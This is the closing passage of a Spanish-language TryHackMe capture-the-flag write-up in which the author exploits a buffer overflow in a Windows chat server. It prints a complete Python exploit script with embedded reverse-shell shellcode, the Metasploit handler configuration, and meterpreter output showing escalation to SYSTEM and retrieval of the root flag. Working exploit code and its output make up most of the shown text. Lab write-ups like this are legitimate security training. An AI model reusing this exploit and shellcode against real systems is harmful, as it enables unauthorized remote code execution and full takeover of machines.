</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc4\x80\x19\x90\xae\x84\x8b\xc7\x46\x87\xea\x2f\xc9\x78&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd9\x2c\x0e\x86\x9c\x04\x64\xb1\x0a\x28\x12\xbe\xda\xa8&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xe2\xe8\xb0\xa8\x8a\x4c\xe1\xfb\xaf\x92\x3c\x68\x7c\x07&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbf\xd8\xd0\x80\xd7\xe6\x0f\xe6\x77\x19\x7a\x74\x7f\xe5&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xf8\x53\xd8\x8d\x02\xe4\xd8\x4d\x69\xe4\x88\x25\x66\xcb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x27\x85\x87\xc6\x6f\x8d\x02\x87\xc2\x2c\x12\x82\x83\xf0&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x13\x21\x18\x03\x69\x4a\x9f\xe4\x8e\x42\xc4\xe5\x8e\x6a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xfa\xda\x58\x53\x88\x1d\x59\xe0\x83\x28\xfc\x41\x0e\x52&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x52\x91\x1b&#34;</span>;
</span></span></code></pre></div><p>Añado el padding y el return, ademas del payload creado. El script final quedaría así:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.109&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2007</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xDF\x14\x50\x62</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x54\x0b\x6e\x5c\xda\xd6\xd9\x74\x24\xf4\x5e\x31\xc9</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x59\x31\x56\x14\x83\xc6\x04\x03\x56\x10\xb6\xfe\x92</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb4\xb9\x01\x6b\x45\xa5\x30\xb9\x21\xae\x61\x0d\x23\x55</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0e\x3f\x3f\x1e\x43\xd4\x30\x97\x2e\xf2\xc5\xa5\x86\xcb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x26\x78\x17\x87\xe5\x1b\xeb\xda\x39\xfb\xd2\x14\x4c\xfa</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\xe3\x3a\x13\xc9\xa3\x4f\xb9\xfe\xc0\x12\x01\xfe\x06</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x19\x39\x78\x22\xde\xcd\x34\x2d\x0f\xa6\x9d\x0d\xff\xb9</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xce\xc5\xb7\xa1\x75\x10\x33\xed\x44\x5c\xf5\x86\x93\x29</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x4e\xea\xed\xa4\xaf\xc2\xe3\xb5\xe8\xe5\x1b\xc0\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x16\xa1\xd3\xd1\x64\x7d\x51\xc5\xcf\xf6\xc1\x21\xf1\xdb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x94\xa2\xfd\x90\xd3\xec\xe1\x27\x37\x87\x1e\xa3\xb6\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\xf7\x9c\x43\xf3\xac\xbd\xd2\x59\x02\xc1\x04\x05\xfb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\x4f\xa4\xea\x18\xb0\x36\x13\x45\x26\xfa\xde\x76\xb6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x94\x69\x04\x84\x3b\xc2\x82\xa4\xb4\xcc\x55\xbd\xd3\xee</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8a\x05\xb3\x10\x2b\x75\x9d\xd6\x7f\x25\xb5\xff\xff\xae</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x45\xff\xd5\x5a\x4c\x97\x15\x32\x68\x66\xfe\x40\x89\x79</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\xcd\x6f\x29\x0a\x9d\x3f\x8a\xfa\x5d\x90\x62\x11\x52</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcf\x93\x1a\xb9\x78\x39\xf5\x17\xd0\xd6\x6c\x32\xaa\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\xe9\xd6\x48\xfa\x1b\x26\x06\x0b\x6e\x34\x7f\x6c\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc4\x80\x19\x90\xae\x84\x8b\xc7\x46\x87\xea\x2f\xc9\x78</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\x2c\x0e\x86\x9c\x04\x64\xb1\x0a\x28\x12\xbe\xda\xa8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe2\xe8\xb0\xa8\x8a\x4c\xe1\xfb\xaf\x92\x3c\x68\x7c\x07</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbf\xd8\xd0\x80\xd7\xe6\x0f\xe6\x77\x19\x7a\x74\x7f\xe5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf8\x53\xd8\x8d\x02\xe4\xd8\x4d\x69\xe4\x88\x25\x66\xcb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x27\x85\x87\xc6\x6f\x8d\x02\x87\xc2\x2c\x12\x82\x83\xf0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\x21\x18\x03\x69\x4a\x9f\xe4\x8e\x42\xc4\xe5\x8e\x6a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfa\xda\x58\x53\x88\x1d\x59\xe0\x83\x28\xfc\x41\x0e\x52</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x91\x1b</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Pongo a escuchar metasploit y ejecuto el script. Veo que se ha ejecutado el shellcode y que tengo una sesión de meterpreter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 192.168.56.1
</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 192.168.56.1
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.1:4444 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 192.168.56.101
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.1:4444 -&gt; 192.168.56.101:49510<span style="color:#f92672">)</span> at 2023-10-01 18:24:31 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: usuario-PC<span style="color:#ae81ff">\u</span>suario
</span></span><span style="display:flex;"><span>meterpreter &gt; getsystem
</span></span><span style="display:flex;"><span>...got system via technique <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Named Pipe Impersonation <span style="color:#f92672">(</span>In Memory/Admin<span style="color:#f92672">))</span>.
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span></code></pre></div><h2 id="atacando-al-servidor-objetivo">Atacando al servidor objetivo</h2>
<p>Como ya tengo un script que me permite explotar la vulnerabilidad, solo tengo que cambiar la IP y el puerto del servidor objetivo y ejecutar el script. Pongo a escuchar metasploit y ejecuto el script. Veo que se ha ejecutado el shellcode y que tengo una sesión de meterpreter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:4444 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.21.205
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">3</span> opened <span style="color:#f92672">(</span>10.14.50.184:4444 -&gt; 10.10.21.205:49163<span style="color:#f92672">)</span> at 2023-10-01 13:31:48 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
</span></span><span style="display:flex;"><span>meterpreter &gt; cd c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
</span></span><span style="display:flex;"><span>meterpreter &gt; cd ..
</span></span><span style="display:flex;"><span>meterpreter &gt; cd ..
</span></span><span style="display:flex;"><span>meterpreter &gt; pwd
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>meterpreter &gt; cd Users<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cd drake<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cd Desktop<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\d</span>rake<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2019-08-30 07:21:08 +0200  desktop.ini
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2019-08-30 07:55:40 +0200  root.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cat root.txt 
</span></span><span style="display:flex;"><span>5b1001de5a44eca47eee71e7942a8f8a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span></code></pre></div><p>De esta forma obtengo la flag root.txt y finalizo la máquina.</p>
<h2 id="conclusiones">Conclusiones</h2>
<p>Esta máquina ha sido interesante por que me ha permitido aplicar en un entorno más realista lo aprendido en la sala de &ldquo;Buffer Overflow Prep&rdquo; de TryHackMe. El script que he usado es ligeramente diferente del original que guardé de la sala anterior, tuve que buscar como hacerlo ya que el chat server envía primero un mensaje de bienvenida y luego espera a recibir un mensaje para el nombre de usuario y otro para el mensaje. Usando en python el comando <strong>recv(1024)</strong> se puede recibir el mensaje de bienvenida y luego enviar el nombre de usuario y el mensaje con el comando <strong>send(bytes(buffer + &ldquo;\r\n&rdquo;, &ldquo;latin-1&rdquo;))</strong>.</p>
<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
</div>
</article>

    
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="/tags/buffer-overflow">#Buffer Overflow</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/exploit-development">#Exploit Development</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/immunity-debugger">#Immunity Debugger</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/medium">#Medium</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/metasploit">#Metasploit</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/meterpreter">#Meterpreter</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/mona">#Mona</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/privilege-escalation">#Privilege Escalation</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/python">#Python</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/reverse-shell">#Reverse Shell</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/tryhackme">#TryHackMe</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/windows">#Windows</a>
        
    </p>






                    </main><footer>
    <hr />


<p><small>
        2024 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
